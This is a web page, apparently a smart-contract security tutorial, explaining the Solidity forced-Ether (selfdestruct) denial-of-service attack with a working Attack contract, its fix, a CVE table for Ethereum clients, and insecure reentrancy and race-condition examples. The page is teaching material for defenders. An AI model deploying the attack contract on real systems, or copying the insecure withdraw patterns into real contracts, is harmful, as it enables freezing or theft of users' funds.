<figure class="aligncenter size-large"><img decoding="async" loading="lazy" width="1024" height="478" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-1024x478.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2163" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-1024x478.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-300x140.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-768x359.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2023/05/image.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>


<p id="ae62">In Solidity, a special function named&nbsp;<code><strong>selfdestruct</strong></code>&nbsp;is used for removing the bytecode from the contract address executing it.&nbsp;<strong>Besides the contract bytecode removal, one side effect is that the Ethers stored in the removing contract would be forcibly sent to any specified address.</strong></p>



<p id="6b3d"><strong>The&nbsp;</strong><code><strong>selfdestruct</strong></code><strong>&nbsp;function can forcibly send Ethers to even the contract that does not implement the&nbsp;</strong><code><strong>receive</strong></code><strong>&nbsp;or&nbsp;</strong><code><strong>fallback</strong></code><strong>&nbsp;function like the&nbsp;</strong><code><strong>InsecureMoonToken</strong></code><strong>&nbsp;contract.</strong></p>



<p>This way, if the attacker deploys and executes the&nbsp;<code>Attack</code>&nbsp;contract containing the&nbsp;<code>selfdestruct</code><strong>&nbsp;</strong>function, they can forcibly send Ethers to the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract by specifying the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract address as the argument of the&nbsp;<code>selfdestruct</code><strong>&nbsp;</strong>function (i.e.,&nbsp;<code>selfdestruct(InsecureMoonToken)</code>).</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">The Attack</h2>



<p>The following code presents the&nbsp;<code>Attack</code>&nbsp;contract that can be used to exploit the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract.</p>



<pre class="wp-block-code"><code>pragma solidity 0.8.17;

contract Attack {
    address immutable moonToken;

    constructor(address _moonToken) {
        moonToken = _moonToken;
    }

    function attack() external payable {
        require(msg.value != 0, "Require some Ether to attack");

        address payable target = payable(moonToken);
        selfdestruct(target);
    }
}</code></pre>



<p class="has-medium-font-size"><strong><a href="https://gist.githubusercontent.com/serial-coder/583c543967b931ea08c45a600daecc68/raw/f8c05e092f9dce6cefe54eaaf2d51457fbc3a245/Attack.sol" target="_blank" rel="noreferrer noopener">GITHUB</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p id="9a1f">To attack the&nbsp;<code>InsecureMoonToken</code>, an attacker performs the attack steps as follows.</p>



<ol>
<li>Deploy the&nbsp;<code>Attack</code>&nbsp;contract as well as specifying the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract address as the contract deployment argument (line 6)</li>



<li>Invoke the&nbsp;<code>Attack.attack()</code>&nbsp;function along with supplying some&nbsp;<em>Ethers</em>&nbsp;for attacking</li>
</ol>



<p id="bcc5">After step 2, the supplied&nbsp;<em>Ethers</em>&nbsp;would be forcibly sent into the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract by way of the&nbsp;<code>selfdestruct</code>&nbsp;function (line 14). Then, any&nbsp;<code>sell</code>&nbsp;transactions would be reverted, leading to a denial-of-service attack to the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full"><img decoding="async" loading="lazy" width="991" height="780" src="./Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks - CRYPTO DEEP TECH_files/image-1.png" alt="Solidity Forcibly Send Ether Vulnerability to a Smart Contract continuation of the list of general EcoSystem security from attacks" class="wp-image-2166" srcset="https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-1.png 991w, https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-1-300x236.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2023/05/image-1-768x604.png 768w" sizes="(max-width: 991px) 100vw, 991px"><figcaption class="wp-element-caption"><code>Figure 2. The attack result</code></figcaption></figure></div>


<p id="c5b7">Figure 2 displays the result of the attack. As you can see, two users bought&nbsp;<em>55 MOONs&nbsp;</em>with&nbsp;<em>55 Ethers</em>. But, after the attacker forcibly sent&nbsp;<em>1 Wei</em>&nbsp;to the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract, the users were no longer selling their MOONs.</p>



<p id="01d8"><strong>Surprise!! You can buy it but may not sell it.</strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">The Solution</h2>



<p>The&nbsp;<code>FixedMoonToken</code>&nbsp;contract below is the remediated version of the&nbsp;<code>InsecureMoonToken</code>&nbsp;contract.</p>



<pre class="wp-block-code"><code>pragma solidity 0.8.17;

contract FixedMoonToken {
    mapping (address =&gt; uint256) private userBalances;

    uint256 public constant TOKEN_PRICE = 1 ether;
    string public constant name = "Moon Token";
    string public constant symbol = "MOON";

    // The token is non-divisible
    // You can buy/sell/transfer 1, 2, 3, or 46 tokens but not 33.5
    uint8 public constant decimals = 0;

    uint256 public totalSupply;

    function buy(uint256 _amount) external payable {
        require(
            msg.value == _amount * TOKEN_PRICE, 
            "Ether submitted and Token amount to buy mismatch"
        );

        userBalances[msg.sender] += _amount;
        totalSupply += _amount;
    }

    function sell(uint256 _amount) external {
        require(userBalances[msg.sender] &gt;= _amount, "Insufficient balance");

        userBalances[msg.sender] -= _amount;
        totalSupply -= _amount;

        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
        require(success, "Failed to send Ether");

        // FIX: Do not rely on address(this).balance. If necessary, however, 
        // apply assert(address(this).balance &gt;= totalSupply * TOKEN_PRICE); instead
        assert(getEtherBalance() &gt;= totalSupply * TOKEN_PRICE);
    }

    function transfer(address _to, uint256 _amount) external {
        require(_to != address(0), "_to address is not valid");
        require(userBalances[msg.sender] &gt;= _amount, "Insufficient balance");
        
        userBalances[msg.sender] -= _amount;
        userBalances[_to] += _amount;
    }

    function getEtherBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUserBalance(address _user) external view returns (uint256) {
        return userBalances[_user];
    }
}</code></pre>



<p><strong><a href="https://gist.githubusercontent.com/serial-coder/583c543967b931ea08c45a600daecc68/raw/f8c05e092f9dce6cefe54eaaf2d51457fbc3a245/FixedMoonToken.sol" target="_blank" rel="noreferrer noopener">GITHUB</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p id="94c3">The smart contract should avoid being dependent on the contract’s Ether balance (i.e.,&nbsp;<code>address(this).balance</code>) as it can be artificially manipulated. If necessary, however, the contract should be prepared for such cases of contract balance manipulation.</p>



<p id="5cdc">To remediate the improper balance assertion issue, the&nbsp;<code>FixedMoonToken</code>&nbsp;contract’s assertion statement was improved by using the&nbsp;<code><strong>&gt;=</strong></code>&nbsp;instead of the&nbsp;<code><strong>==</strong></code>&nbsp;symbol as follows:&nbsp;<code><strong>assert(getEtherBalance() &gt;= totalSupply * TOKEN_PRICE);</strong></code><strong>&nbsp;</strong>(line 37).</p>



<p id="fb96">As a result, even if the contract balance is manipulated, the&nbsp;<code>FixedMoonToken</code>&nbsp;contract’s&nbsp;<code>sell</code>&nbsp;function could still work fine.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<figure class="wp-block-table"><table><tbody><tr><th>#</th><th>CVE ID</th><th>CWE ID</th><th># of Exploits</th><th>Vulnerability Type(s)</th><th>Publish Date</th><th>Update Date</th><th>Score</th><th>Gained Access Level</th><th>Access</th><th>Complexity</th><th>Authentication</th><th>Conf.</th><th>Integ.</th><th>Avail.</th></tr><tr><td><a></a>1</td><td><a href="https://www.cvedetails.com/cve/CVE-2022-37450/">CVE-2022-37450</a></td><td></td><td></td><td></td><td>2022-08-05</td><td>2022-08-12</td><td>0.0</td><td>None</td><td>???</td><td>???</td><td>???</td><td>???</td><td>???</td><td>???</td></tr><tr><td colspan="20">Go Ethereum (aka geth) through 1.10.21 allows attackers to increase rewards by mining blocks in certain situations, and using a manipulation of time-difference values to achieve replacement of main-chain blocks, aka Riskless Uncle Making (RUM), as exploited in the wild in 2020 through 2022.</td></tr><tr><td><a></a>2</td><td><a href="https://www.cvedetails.com/cve/CVE-2022-29177/">CVE-2022-29177</a></td><td></td><td></td><td></td><td>2022-05-20</td><td>2022-06-06</td><td>4.3</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum is the official Golang implementation of the Ethereum protocol. Prior to version 1.10.17, a vulnerable node, if configured to use high verbosity logging, can be made to crash when handling specially crafted p2p messages sent from an attacker node. Version 1.10.17 contains a patch that addresses the problem. As a workaround, setting loglevel to default level (`INFO`) makes the node not vulnerable to this attack.</td></tr><tr><td><a></a>3</td><td><a href="https://www.cvedetails.com/cve/CVE-2022-23328/">CVE-2022-23328</a></td><td><a href="https://www.cvedetails.com/cwe-details/400/cwe.html">400</a></td><td></td><td>DoS</td><td>2022-03-04</td><td>2022-03-17</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">A design flaw in all versions of Go-Ethereum allows an attacker node to send 5120 pending transactions of a high gas price from one account that all fully spend the full balance of the account to a victim Geth node, which can purge all of pending transactions in a victim node’s memory pool and then occupy the memory pool to prevent new transactions from entering the pool, resulting in a denial of service (DoS).</td></tr><tr><td><a></a>4</td><td><a href="https://www.cvedetails.com/cve/CVE-2022-23327/">CVE-2022-23327</a></td><td></td><td></td><td>DoS</td><td>2022-03-04</td><td>2022-03-17</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">A design flaw in Go-Ethereum 1.10.12 and older versions allows an attacker node to send 5120 future transactions with a high gas price in one message, which can purge all of pending transactions in a victim node’s memory pool, causing a denial of service (DoS).</td></tr><tr><td><a></a>5</td><td><a href="https://www.cvedetails.com/cve/CVE-2022-1930/">CVE-2022-1930</a></td><td><a href="https://www.cvedetails.com/cwe-details/697/cwe.html">697</a></td><td></td><td>DoS</td><td>2022-08-22</td><td>2022-08-25</td><td>0.0</td><td>None</td><td>???</td><td>???</td><td>???</td><td>???</td><td>???</td><td>???</td></tr><tr><td colspan="20">An exponential ReDoS (Regular Expression Denial of Service) can be triggered in the eth-account PyPI package, when an attacker is able to supply arbitrary input to the encode_structured_data method</td></tr><tr><td><a></a>6</td><td><a href="https://www.cvedetails.com/cve/CVE-2021-43668/">CVE-2021-43668</a></td><td><a href="https://www.cvedetails.com/cwe-details/476/cwe.html">476</a></td><td></td><td>DoS</td><td>2021-11-18</td><td>2021-11-23</td><td>2.1</td><td>None</td><td>Local</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go-Ethereum 1.10.9 nodes crash (denial of service) after receiving a serial of messages and cannot be recovered. They will crash with “runtime error: invalid memory address or nil pointer dereference” and arise a SEGV signal.</td></tr><tr><td><a></a>7</td><td><a href="https://www.cvedetails.com/cve/CVE-2021-42219/">CVE-2021-42219</a></td><td></td><td></td><td>DoS</td><td>2022-03-17</td><td>2022-03-28</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go-Ethereum v1.10.9 was discovered to contain an issue which allows attackers to cause a denial of service (DoS) via sending an excessive amount of messages to a node. This is caused by missing memory in the component /ethash/algorithm.go.</td></tr><tr><td><a></a>8</td><td><a href="https://www.cvedetails.com/cve/CVE-2021-41173/">CVE-2021-41173</a></td><td></td><td></td><td></td><td>2021-10-26</td><td>2021-10-28</td><td>3.5</td><td>None</td><td>Remote</td><td>Medium</td><td>???</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum is the official Golang implementation of the Ethereum protocol. Prior to version 1.10.9, a vulnerable node is susceptible to crash when processing a maliciously crafted message from a peer. Version v1.10.9 contains patches to the vulnerability. There are no known workarounds aside from upgrading.</td></tr><tr><td><a></a>9</td><td><a href="https://www.cvedetails.com/cve/CVE-2021-39137/">CVE-2021-39137</a></td><td><a href="https://www.cvedetails.com/cwe-details/436/cwe.html">436</a></td><td></td><td></td><td>2021-08-24</td><td>2021-08-31</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">go-ethereum is the official Go implementation of the Ethereum protocol. In affected versions a consensus-vulnerability in go-ethereum (Geth) could cause a chain split, where vulnerable versions refuse to accept the canonical chain. Further details about the vulnerability will be disclosed at a later date. A patch is included in the upcoming `v1.10.8` release. No workaround are available.</td></tr><tr><td><a></a>10</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26800/">CVE-2020-26800</a></td><td><a href="https://www.cvedetails.com/cwe-details/787/cwe.html">787</a></td><td></td><td>DoS Overflow</td><td>2021-01-11</td><td>2021-01-13</td><td>4.3</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">A stack overflow vulnerability in Aleth Ethereum C++ client version &lt;= 1.8.0 using a specially crafted a config.json file may result in a denial of service.</td></tr><tr><td><a></a>11</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26265/">CVE-2020-26265</a></td><td><a href="https://www.cvedetails.com/cwe-details/682/cwe.html">682</a></td><td></td><td></td><td>2020-12-11</td><td>2020-12-14</td><td>3.5</td><td>None</td><td>Remote</td><td>Medium</td><td>???</td><td>None</td><td>Partial</td><td>None</td></tr><tr><td colspan="20">Go Ethereum, or “Geth”, is the official Golang implementation of the Ethereum protocol. In Geth from version 1.9.4 and before version 1.9.20 a consensus-vulnerability could cause a chain split, where vulnerable versions refuse to accept the canonical chain. The fix was included in the Paragade release version 1.9.20. No individual workaround patches have been made — all users are recommended to upgrade to a newer version.</td></tr><tr><td><a></a>12</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26264/">CVE-2020-26264</a></td><td><a href="https://www.cvedetails.com/cwe-details/400/cwe.html">400</a></td><td></td><td></td><td>2020-12-11</td><td>2020-12-14</td><td>4.0</td><td>None</td><td>Remote</td><td>Low</td><td>???</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum, or “Geth”, is the official Golang implementation of the Ethereum protocol. In Geth before version 1.9.25 a denial-of-service vulnerability can make a LES server crash via malicious GetProofsV2 request from a connected LES client. This vulnerability only concerns users explicitly enabling les server; disabling les prevents the exploit. The vulnerability was patched in version 1.9.25.</td></tr><tr><td><a></a>13</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26242/">CVE-2020-26242</a></td><td></td><td></td><td></td><td>2020-11-25</td><td>2020-12-03</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum, or “Geth”, is the official Golang implementation of the Ethereum protocol. In Geth before version 1.9.18, there is a Denial-of-service (crash) during block processing. This is fixed in 1.9.18.</td></tr><tr><td><a></a>14</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26241/">CVE-2020-26241</a></td><td><a href="https://www.cvedetails.com/cwe-details/682/cwe.html">682</a></td><td></td><td></td><td>2020-11-25</td><td>2020-12-03</td><td>5.5</td><td>None</td><td>Remote</td><td>Low</td><td>???</td><td>None</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum, or “Geth”, is the official Golang implementation of the Ethereum protocol. This is a Consensus vulnerability in Geth before version 1.9.17 which can be used to cause a chain-split where vulnerable nodes reject the canonical chain. Geth’s pre-compiled dataCopy (at 0x00…04) contract did a shallow copy on invocation. An attacker could deploy a contract that writes X to an EVM memory region R, then calls 0x00..04 with R as an argument, then overwrites R to Y, and finally invokes the RETURNDATACOPY opcode. When this contract is invoked, a consensus-compliant node would push X on the EVM stack, whereas Geth would push Y. This is fixed in version 1.9.17.</td></tr><tr><td><a></a>15</td><td><a href="https://www.cvedetails.com/cve/CVE-2020-26240/">CVE-2020-26240</a></td><td><a href="https://www.cvedetails.com/cwe-details/682/cwe.html">682</a></td><td></td><td></td><td>2020-11-25</td><td>2020-12-03</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>Partial</td><td>None</td></tr><tr><td colspan="20">Go Ethereum, or “Geth”, is the official Golang implementation of the Ethereum protocol. An ethash mining DAG generation flaw in Geth before version 1.9.24 could cause miners to erroneously calculate PoW in an upcoming epoch (estimated early January, 2021). This happened on the ETC chain on 2020-11-06. This issue is relevant only for miners, non-mining nodes are unaffected. This issue is fixed as of 1.9.24</td></tr><tr><td><a></a>16</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-20421/">CVE-2018-20421</a></td><td><a href="https://www.cvedetails.com/cwe-details/770/cwe.html">770</a></td><td></td><td>DoS</td><td>2018-12-24</td><td>2019-10-03</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">Go Ethereum (aka geth) 1.8.19 allows attackers to cause a denial of service (memory consumption) by rewriting the length of a dynamic array in memory, and then writing data to a single memory location with a large index number, as demonstrated by use of “assembly { mstore }” followed by a “c[0xC800000] = 0xFF” assignment.</td></tr><tr><td><a></a>17</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-19184/">CVE-2018-19184</a></td><td><a href="https://www.cvedetails.com/cwe-details/476/cwe.html">476</a></td><td></td><td>DoS</td><td>2018-11-12</td><td>2018-12-13</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">cmd/evm/runner.go in Go Ethereum (aka geth) 1.8.17 allows attackers to cause a denial of service (SEGV) via crafted bytecode.</td></tr><tr><td><a></a>18</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-18920/">CVE-2018-18920</a></td><td><a href="https://www.cvedetails.com/cwe-details/119/cwe.html">119</a></td><td></td><td>Exec Code Overflow</td><td>2018-11-12</td><td>2019-02-04</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">Py-EVM v0.2.0-alpha.33 allows attackers to make a vm.execute_bytecode call that triggers computation._stack.values with ‘”stack”: [100, 100, 0]’ where b’\x’ was expected, resulting in an execution failure because of an invalid opcode. This is reportedly related to “smart contracts can be executed indefinitely without gas being paid.”</td></tr><tr><td><a></a>19</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-16733/">CVE-2018-16733</a></td><td><a href="https://www.cvedetails.com/cwe-details/20/cwe.html">20</a></td><td></td><td></td><td>2018-09-08</td><td>2018-11-07</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>Partial</td><td>None</td></tr><tr><td colspan="20">In Go Ethereum (aka geth) before 1.8.14, TraceChain in eth/api_tracer.go does not verify that the end block is after the start block.</td></tr><tr><td><a></a>20</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-15890/">CVE-2018-15890</a></td><td><a href="https://www.cvedetails.com/cwe-details/502/cwe.html">502</a></td><td></td><td></td><td>2019-06-20</td><td>2019-06-20</td><td>10.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>Complete</td><td>Complete</td><td>Complete</td></tr><tr><td colspan="20">An issue was discovered in EthereumJ 1.8.2. There is Unsafe Deserialization in ois.readObject in mine/Ethash.java and decoder.readObject in crypto/ECKey.java. When a node syncs and mines a new block, arbitrary OS commands can be run on the server.</td></tr><tr><td><a></a>21</td><td><a href="https://www.cvedetails.com/cve/CVE-2018-12018/">CVE-2018-12018</a></td><td><a href="https://www.cvedetails.com/cwe-details/129/cwe.html">129</a></td><td></td><td>DoS</td><td>2018-07-05</td><td>2018-09-04</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">The GetBlockHeadersMsg handler in the LES protocol implementation in Go Ethereum (aka geth) before 1.8.11 may lead to an access violation because of an integer signedness error for the array index, which allows attackers to launch a Denial of Service attack by sending a packet with a -1 query.Skip value. The vulnerable remote node would be crashed by such an attack immediately, aka the EPoD (Ethereum Packet of Death) issue.</td></tr><tr><td><a></a>22</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-14457/">CVE-2017-14457</a></td><td><a href="https://www.cvedetails.com/cwe-details/125/cwe.html">125</a></td><td></td><td>DoS +Info</td><td>2018-01-19</td><td>2023-01-30</td><td>6.4</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>Partial</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">An exploitable information leak/denial of service vulnerability exists in the libevm (Ethereum Virtual Machine) `create2` opcode handler of CPP-Ethereum. A specially crafted smart contract code can cause an out-of-bounds read leading to memory disclosure or denial of service. An attacker can create/send malicious a smart contract to trigger this vulnerability.</td></tr><tr><td><a></a>23</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-14451/">CVE-2017-14451</a></td><td><a href="https://www.cvedetails.com/cwe-details/125/cwe.html">125</a></td><td></td><td>Exec Code</td><td>2020-12-02</td><td>2020-12-09</td><td>7.5</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable out-of-bounds read vulnerability exists in libevm (Ethereum Virtual Machine) of CPP-Ethereum. A specially crafted smart contract code can cause an out-of-bounds read which can subsequently trigger an out-of-bounds write resulting in remote code execution. An attacker can create/send malicious smart contract to trigger this vulnerability.</td></tr><tr><td><a></a>24</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12119/">CVE-2017-12119</a></td><td><a href="https://www.cvedetails.com/cwe-details/754/cwe.html">754</a></td><td></td><td>DoS</td><td>2018-01-19</td><td>2022-12-14</td><td>5.0</td><td>None</td><td>Remote</td><td>Low</td><td>Not required</td><td>None</td><td>None</td><td>Partial</td></tr><tr><td colspan="20">An exploitable unhandled exception vulnerability exists in multiple APIs of CPP-Ethereum JSON-RPC. Specially crafted JSON requests can cause an unhandled exception resulting in denial of service. An attacker can send malicious JSON to trigger this vulnerability.</td></tr><tr><td><a></a>25</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12118/">CVE-2017-12118</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td></td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in miner_stop API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). An attacker can send JSON to trigger this vulnerability.</td></tr><tr><td><a></a>26</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12117/">CVE-2017-12117</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in miner_start API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass. An attacker can send JSON to trigger this vulnerability.</td></tr><tr><td><a></a>27</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12116/">CVE-2017-12116</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in miner_setGasPrice API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass. An attacker can send JSON to trigger this vulnerability.</td></tr><tr><td><a></a>28</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12115/">CVE-2017-12115</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in miner_setEtherbase API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass.</td></tr><tr><td><a></a>29</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12114/">CVE-2017-12114</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>4.3</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>None</td><td>None</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in admin_peers API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass. An attacker can send JSON to trigger this vulnerability.</td></tr><tr><td><a></a>30</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12113/">CVE-2017-12113</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in admin_nodeInfo API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass. An attacker can send JSON to trigger this vulnerability.</td></tr><tr><td><a></a>31</td><td><a href="https://www.cvedetails.com/cve/CVE-2017-12112/">CVE-2017-12112</a></td><td><a href="https://www.cvedetails.com/cwe-details/863/cwe.html">863</a></td><td></td><td>Bypass</td><td>2018-01-19</td><td>2022-12-14</td><td>6.8</td><td>None</td><td>Remote</td><td>Medium</td><td>Not required</td><td>Partial</td><td>Partial</td><td>Partial</td></tr><tr><td colspan="20">An exploitable improper authorization vulnerability exists in admin_addPeer API of cpp-ethereum’s JSON-RPC (commit 4e1015743b95821849d001618a7ce82c7c073768). A JSON request can cause an access to the restricted functionality resulting in authorization bypass. An attacker can send JSON to trigger this vulnerability.</td></tr></tbody></table></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p></p>



<h1 class="wp-block-heading has-background" style="background-color:#f78da812">Known Attacks</h1>



<p>The following is a list of known attacks which you should be aware of, and defend against when writing smart contracts.</p>



<h2 class="wp-block-heading has-background" id="race-conditions42" style="background-color:#f78da812">Race Conditions</h2>



<p>One of the major dangers of calling external contracts is that they can take over the control flow, and make changes to your data that the calling function wasn’t expecting. This class of bug can take many forms, and both of the major bugs that led to the DAO’s collapse were bugs of this sort.</p>



<h3 class="wp-block-heading" id="reentrancy">Reentrancy</h3>



<p>The first version of this bug to be noticed involved functions that could be called repeatedly, before the first invocation of the function was finished. This may cause the different invocations of the function to interact in destructive ways.</p>



<pre class="wp-block-preformatted">// INSECURE
mapping (address =&gt; uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    require(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller's code is executed, and can call withdrawBalance again
    userBalances[msg.sender] = 0;
}
</pre>



<p>Since the user’s balance is not set to 0 until the very end of the function, the second (and later) invocations will still succeed, and will withdraw the balance over and over again. A very similar bug was one of the vulnerabilities in the DAO attack.</p>



<p>In the example given, the best way to avoid the problem is to&nbsp;<a href="https://github.com/ConsenSys/smart-contract-best-practices#send-vs-call-value">use&nbsp;<code>send()</code>&nbsp;instead of&nbsp;<code>call.value()()</code></a>. This will prevent any external code from being executed.</p>



<p>However, if you can’t remove the external call, the next simplest way to prevent this attack is to make sure you don’t call an external function until you’ve done all the internal work you need to do:</p>



<pre class="wp-block-preformatted">mapping (address =&gt; uint) private userBalances;

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    userBalances[msg.sender] = 0;
    require(msg.sender.call.value(amountToWithdraw)()); // The user's balance is already 0, so future invocations won't withdraw anything
}
</pre>



<p>Note that if you had another function which called&nbsp;<code>withdrawBalance()</code>, it would be potentially subject to the same attack, so you must treat any function which calls an untrusted contract as itself untrusted. See below for further discussion of potential solutions.</p>



<h3 class="wp-block-heading has-background" id="cross-function-race-conditions" style="background-color:#f78da812">Cross-function Race Conditions</h3>



<p>An attacker may also be able to do a similar attack using two different functions that share the same state.</p>



<pre class="wp-block-preformatted">// INSECURE
mapping (address =&gt; uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] &gt;= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    require(msg.sender.call.value(amountToWithdraw)()); // At this point, the caller's code is executed, and can call transfer()
    userBalances[msg.sender] = 0;
}
</pre>



